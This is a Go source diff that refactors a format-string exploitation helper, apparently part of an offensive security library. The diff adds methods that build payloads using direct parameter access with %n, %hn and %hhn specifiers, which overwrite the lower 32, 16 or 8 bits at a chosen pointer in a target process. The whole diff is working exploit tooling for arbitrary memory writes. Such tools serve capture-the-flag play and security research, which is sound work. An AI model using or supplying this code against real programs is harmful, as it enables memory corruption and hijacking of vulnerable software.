@@ -29,11 +29,15 @@ func NewDPAFormatStringWriter(config DPAFormatStringWriterConfig) (*DPAFormatStr
 		dpaConfig: config.DPAConfig,
 		builderAndMemAlignedLenFn: func() (formatStringBuilder, int) {
 			fmtStrBuilder := formatStringBuilder{
-				prefixAndSuffix:  []byte("|"),
+				returnDataDelim:  []byte("|"),
 				endOfStringDelim: []byte("foozlefu"),
 			}
 			buff := bytes.NewBuffer(nil)
-			fmtStrBuilder.appendDPAWrite(config.MaxWrite, config.DPAConfig.MaxNumParams, []byte("p"), buff)
+			fmtStrBuilder.appendDPAWrite(
+				config.MaxWrite,
+				config.DPAConfig.MaxNumParams,
+				[]byte("aaa"), // This could potentially be 'hhn'.
+				buff)
 			return fmtStrBuilder, stringLenMemoryAligned(buff.Bytes(), config.DPAConfig.PointerSize)
 		},
 	})
@@ -52,29 +56,111 @@ type DPAFormatStringWriter struct {
 	leakConfig *dpaLeakConfig
 }
 
-func (o DPAFormatStringWriter) WriteAtOrExit(i int, pointer Pointer) {
-	err := o.WriteAt(i, pointer)
+func (o DPAFormatStringWriter) OverwriteLower32BitsAtOrExit(newLower32Bits int, pointer Pointer) {
+	err := o.OverwriteLower32BitsAt(newLower32Bits, pointer)
 	if err != nil {
 		defaultExitFn(fmt.Errorf("failed to write %d to %s - %w",
-			i, pointer.HexString(), err))
+			newLower32Bits, pointer.HexString(), err))
 	}
 }
 
-func (o DPAFormatStringWriter) WriteAt(numToWrite int, pointer Pointer) error {
-	if numToWrite > o.config.MaxWrite {
-		return fmt.Errorf("the specified write size of %d cannot be greater than the configured max of %d",
-			numToWrite, o.config.MaxWrite)
+func (o DPAFormatStringWriter) OverwriteLower32BitsAt(newLower32Bits int, pointer Pointer) error {
+	str, err := o.Lower32BitsFormatString(newLower32Bits)
+	if err != nil {
+		return err
 	}
 
-	_, err := leakDataWithFormatString(
+	_, err = leakDataWithFormatString(
 		o.config.DPAConfig.ProcessIOFn(),
-		append(o.FormatString(numToWrite), pointer...),
+		append(str, pointer...),
 		o.leakConfig.builder)
 	return err
 }
 
-func (o DPAFormatStringWriter) FormatString(numToWrite int) []byte {
+func (o DPAFormatStringWriter) Lower32BitsFormatString(numToWrite int) ([]byte, error) {
+	adjustedNum, err := o.adjustNumToWrite(numToWrite)
+	if err != nil {
+		return nil, err
+	}
+
 	buff := bytes.NewBuffer(nil)
-	o.leakConfig.builder.appendDPAWrite(numToWrite, o.leakConfig.paramNum, []byte{'n'}, buff)
-	return o.leakConfig.builder.build(o.leakConfig.alignLen, buff)
+	o.leakConfig.builder.appendDPAWrite(adjustedNum, o.leakConfig.paramNum, []byte{'n'}, buff)
+	return o.leakConfig.builder.build(o.leakConfig.alignLen, buff), nil
+}
+
+func (o DPAFormatStringWriter) OverwriteLower16BitsAtOrExit(newLower16Bits int, pointer Pointer) {
+	err := o.OverwriteLower16BitsAt(newLower16Bits, pointer)
+	if err != nil {
+		defaultExitFn(fmt.Errorf("failed to write %d to %s - %w",
+			newLower16Bits, pointer.HexString(), err))
+	}
+}
+
+func (o DPAFormatStringWriter) OverwriteLower16BitsAt(newLower16Bits int, pointer Pointer) error {
+	str, err := o.Lower16BitsFormatString(newLower16Bits)
+	if err != nil {
+		return err
+	}
+
+	_, err = leakDataWithFormatString(
+		o.config.DPAConfig.ProcessIOFn(),
+		append(str, pointer...),
+		o.leakConfig.builder)
+	return err
+}
+
+func (o DPAFormatStringWriter) Lower16BitsFormatString(newLower16Bits int) ([]byte, error) {
+	adjustedNum, err := o.adjustNumToWrite(newLower16Bits)
+	if err != nil {
+		return nil, err
+	}
+
+	buff := bytes.NewBuffer(nil)
+	o.leakConfig.builder.appendDPAWrite(adjustedNum, o.leakConfig.paramNum, []byte{'h', 'n'}, buff)
+	return o.leakConfig.builder.build(o.leakConfig.alignLen, buff), nil
+}
+
+func (o DPAFormatStringWriter) OverwriteLower8BitsAtOrExit(newLower8Bits int, pointer Pointer) {
+	err := o.OverwriteLower8BitsAt(newLower8Bits, pointer)
+	if err != nil {
+		defaultExitFn(fmt.Errorf("failed to write %d to %s - %w",
+			newLower8Bits, pointer.HexString(), err))
+	}
+}
+
+func (o DPAFormatStringWriter) OverwriteLower8BitsAt(newLower8Bits int, pointer Pointer) error {
+	str, err := o.Lower8BitsFormatString(newLower8Bits)
+	if err != nil {
+		return err
+	}
+
+	_, err = leakDataWithFormatString(
+		o.config.DPAConfig.ProcessIOFn(),
+		append(str, pointer...),
+		o.leakConfig.builder)
+	return err
+}
+
+func (o DPAFormatStringWriter) Lower8BitsFormatString(newLower8Bits int) ([]byte, error) {
+	adjustedNum, err := o.adjustNumToWrite(newLower8Bits)
+	if err != nil {
+		return nil, err
+	}
+
+	buff := bytes.NewBuffer(nil)
+	o.leakConfig.builder.appendDPAWrite(adjustedNum, o.leakConfig.paramNum, []byte{'h', 'h', 'n'}, buff)
+	return o.leakConfig.builder.build(o.leakConfig.alignLen, buff), nil
+}
+
+func (o DPAFormatStringWriter) adjustNumToWrite(newValue int) (int, error) {
+	if newValue <= 0 {
+		return 0, fmt.Errorf("the specified write size of %d cannot be less than or equal to 0", newValue)
+	}
+
+	if newValue > o.config.MaxWrite {
+		return 0, fmt.Errorf("the specified write size of %d cannot be greater than the configured max of %d",
+			newValue, o.config.MaxWrite)
+	}
+
+	return newValue-len(o.leakConfig.builder.returnDataDelim), nil
 }
